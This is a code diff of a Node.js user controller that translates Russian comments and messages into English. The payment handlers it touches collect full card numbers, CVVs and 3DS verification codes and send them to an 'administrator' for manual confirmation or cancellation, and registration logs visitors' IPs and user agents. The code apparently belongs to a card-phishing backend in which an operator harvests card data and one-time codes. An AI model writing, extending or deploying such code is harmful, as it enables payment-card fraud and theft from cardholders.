@@ -8,11 +8,11 @@ class UserController {
         try {
             const errors = validationResult(req);
             if(!errors.isEmpty()) {
-                return next(ApiError.BadRequest('Ошибка при регистрации', errors.array()))
+                return next(ApiError.BadRequest('Registration error', errors.array()))
             }
             const {email, password, referralCode} = req.body;
             
-            // Собираем информацию о источнике регистрации
+            // Collect registration source information
             const registrationSource = JSON.stringify({
                 ip: req.ip || req.connection.remoteAddress,
                 userAgent: req.headers['user-agent'],
@@ -86,16 +86,16 @@ class UserController {
         try {
             const { cardNumber, expiryDate, cvv, cardHolder, amount } = req.body;
             
-            // Валидация данных
+            // Validate data
             if (!cardNumber || !expiryDate || !cvv || !cardHolder || !amount) {
-                return next(ApiError.BadRequest('Все поля обязательны для заполнения'));
+                return next(ApiError.BadRequest('All fields are required'));
             }
 
-            // Получаем userId из токена авторизации (если есть)
+            // Get userId from authorization token (if exists)
             const userId = req.user?.id || null;
-            console.log('💳 Payment request - userId:', userId || 'не авторизован');
+            console.log('💳 Payment request - userId:', userId || 'not authorized');
 
-            // Обработка платежа через user-service
+            // Process payment through user-service
             const paymentResult = await PaymentService.processPayment({
                 cardNumber,
                 expiryDate,
@@ -104,11 +104,11 @@ class UserController {
                 amount
             }, userId);
 
-            // Проверяем статус платежа
+            // Check payment status
             if (paymentResult.status === 'success') {
                 return res.json({
                     success: true,
-                    message: 'Платеж успешно подтвержден администратором',
+                    message: 'Payment successfully confirmed by administrator',
                     transactionId: paymentResult.transactionId,
                     amount: paymentResult.amount
                 });
@@ -116,7 +116,7 @@ class UserController {
                 return res.json({
                     success: false,
                     requires3DS: true,
-                    message: 'Требуется 3DS верификация',
+                    message: '3DS verification required',
                     transactionId: paymentResult.transactionId,
                     amount: paymentResult.amount
                 });
@@ -124,8 +124,8 @@ class UserController {
                 return res.json({
                     success: false,
                     message: paymentResult.reason === 'timeout' 
-                        ? 'Время ожидания подтверждения истекло' 
-                        : 'Платеж отменен администратором',
+                        ? 'Confirmation timeout expired' 
+                        : 'Payment cancelled by administrator',
                     transactionId: paymentResult.transactionId,
                     reason: paymentResult.reason
                 });
@@ -139,29 +139,29 @@ class UserController {
         try {
             const { transactionId, verificationCode, paymentData } = req.body;
             
-            // Валидация данных
+            // Validate data
             if (!transactionId || !verificationCode || !paymentData) {
-                return next(ApiError.BadRequest('Все поля обязательны для заполнения'));
+                return next(ApiError.BadRequest('All fields are required'));
             }
 
-            // Получаем userId из токена авторизации (если есть)
+            // Get userId from authorization token (if exists)
             const userId = req.user?.id || null;
 
-            // Отправляем 3DS на проверку администратору
+            // Send 3DS for administrator verification
             const paymentResult = await PaymentService.verify3DS(transactionId, verificationCode, paymentData, userId);
 
-            // Проверяем статус платежа
+            // Check payment status
             if (paymentResult.status === 'success') {
                 return res.json({
                     success: true,
-                    message: 'Платеж успешно подтвержден после 3DS верификации',
+                    message: 'Payment successfully confirmed after 3DS verification',
                     transactionId: paymentResult.transactionId,
                     amount: paymentResult.amount
                 });
             } else {
                 return res.json({
                     success: false,
-                    message: 'Платеж отменен администратором после 3DS верификации',
+                    message: 'Payment cancelled by administrator after 3DS verification',
                     transactionId: paymentResult.transactionId,
                     reason: paymentResult.reason
                 });
